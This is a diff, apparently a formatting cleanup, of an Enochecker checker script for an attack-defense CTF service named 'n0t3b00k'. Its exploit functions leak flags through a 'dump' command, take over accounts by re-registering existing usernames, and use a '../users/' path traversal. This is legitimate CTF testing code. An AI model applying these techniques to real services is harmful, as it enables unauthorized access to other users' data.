@@ -33,12 +33,13 @@ Checker config
 
 SERVICE_PORT = 2323
 checker = Enochecker("n0t3b00k", SERVICE_PORT)
-app = lambda: checker.app
+def app(): return checker.app
 
 
 """
 Utility functions
 """
+
 
 class Connection:
     def __init__(self, socket: AsyncSocket, logger: LoggerAdapter):
@@ -74,12 +75,13 @@ def _get_connection(socket: AsyncSocket, logger: LoggerAdapter) -> Connection:
 CHECKER FUNCTIONS
 """
 
+
 @checker.putflag(0)
 async def putflag_note(
     task: PutflagCheckerTaskMessage,
     db: ChainDB,
     conn: Connection,
-    logger: LoggerAdapter,    
+    logger: LoggerAdapter,
 ) -> None:
     # First we need to register a user. So let's create some random strings. (Your real checker should use some funny usernames or so)
     username: str = "".join(
@@ -120,11 +122,12 @@ async def putflag_note(
     logger.debug(f"Sending exit command")
     conn.writer.write(f"exit\n".encode())
     await conn.writer.drain()
-    
+
     # Save the generated values for the associated getflag() call.
     await db.set("userdata", (username, password, noteId))
 
     return username
+
 
 @checker.getflag(0)
 async def getflag_note(
@@ -154,7 +157,7 @@ async def getflag_note(
     logger.debug(f"Sending exit command")
     conn.writer.write(f"exit\n".encode())
     await conn.writer.drain()
-        
+
 
 @checker.putnoise(0)
 async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
@@ -200,13 +203,14 @@ async def putnoise0(task: PutnoiseCheckerTaskMessage, db: ChainDB, logger: Logge
     await conn.writer.drain()
 
     await db.set("userdata", (username, password, noteId, randomNote))
-        
+
+
 @checker.getnoise(0)
 async def getnoise0(task: GetnoiseCheckerTaskMessage, db: ChainDB, logger: LoggerAdapter, conn: Connection):
     try:
         (username, password, noteId, randomNote) = await db.get('userdata')
     except:
-        raise MumbleException("Putnoise Failed!") 
+        raise MumbleException("Putnoise Failed!")
 
     logger.debug(f"Connecting to service")
     welcome = await conn.reader.readuntil(b">")
@@ -252,6 +256,7 @@ async def havoc0(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Con
     ]:
         assert_in(line.encode(), helpstr, "Received incomplete response.")
 
+
 @checker.havoc(1)
 async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
     logger.debug(f"Connecting to service")
@@ -281,6 +286,7 @@ async def havoc1(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Con
 
     # conn.writer.close()
     # await conn.writer.wait_closed()
+
 
 @checker.havoc(2)
 async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Connection):
@@ -325,8 +331,9 @@ async def havoc2(task: HavocCheckerTaskMessage, logger: LoggerAdapter, conn: Con
     if not noteId.encode() in data:
         raise MumbleException("List command does not work as intended")
 
+
 @checker.exploit(0)
-async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
+async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
     welcome = await conn.reader.readuntil(b">")
     conn.writer.write(b"dump\nexit\n")
     await conn.writer.drain()
@@ -335,8 +342,9 @@ async def exploit0(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
         return flag
     raise MumbleException("flag not found")
 
+
 @checker.exploit(1)
-async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
+async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
     welcome = await conn.reader.readuntil(b">")
     conn.writer.write(b"user\n")
     await conn.writer.drain()
@@ -345,7 +353,8 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
     for user in user_list:
         user_name = user.split()[-1]
-        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" % (user_name, user_name))
+        conn.writer.write(b"reg %s foo\nlog %s foo\n list\n" %
+                          (user_name, user_name))
         await conn.writer.drain()
         await conn.reader.readuntil(b">")  # successfully registered
         await conn.reader.readuntil(b">")  # successfully logged in
@@ -359,8 +368,9 @@ async def exploit1(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
                 return flag
     raise MumbleException("flag not found")
 
+
 @checker.exploit(2)
-async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger:LoggerAdapter) -> Optional[str]:
+async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn: Connection, logger: LoggerAdapter) -> Optional[str]:
     welcome = await conn.reader.readuntil(b">")
     conn.writer.write(b"user\n")
     await conn.writer.drain()
@@ -369,7 +379,8 @@ async def exploit2(task: ExploitCheckerTaskMessage, searcher: FlagSearcher, conn
     user_list = (await conn.reader.readuntil(b">")).split(b"\n")[:-1]
     for user in user_list:
         user_name = user.split()[-1]
-        conn.writer.write(b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
+        conn.writer.write(
+            b"reg ../users/%s foo\nlog %s foo\n list\n" % (user_name, user_name))
         await conn.writer.drain()
         await conn.reader.readuntil(b">")  # successfully registered
         await conn.reader.readuntil(b">")  # successfully logged in
